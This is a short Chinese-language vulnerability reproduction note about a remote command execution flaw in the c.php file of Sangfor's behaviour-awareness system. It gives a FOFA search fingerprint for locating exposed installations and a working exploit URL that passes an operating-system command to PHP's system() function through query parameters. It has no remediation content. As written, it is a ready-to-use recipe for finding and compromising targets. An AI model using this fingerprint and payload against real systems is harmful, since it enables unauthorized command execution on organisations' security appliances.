# 深信服-行为感知系统-c.php-远程命令执行漏洞

## 漏洞描述

深信服 行为感知系统  c.php  远程命令执行漏洞，使用与EDR相同模板和部分文件导致命令执行

## 漏洞影响

> [!NOTE]
>
> 深信服 行为感知系统

## FOFA

> [!NOTE]
>
> body="isHighPerformance : !!SFIsHighPerformance,"	

## 漏洞复现

登录页面如下

![image-20210531194638650](深信服-行为感知系统-c.php-远程命令执行漏洞.assets/1627363090614484.jpg)

访问漏洞Url

```
/tool/log/c.php?strip_slashes=system&host=ipconfig
```

![image-20210531194727866](深信服-行为感知系统-c.php-远程命令执行漏洞.assets/1627363090896502.jpg)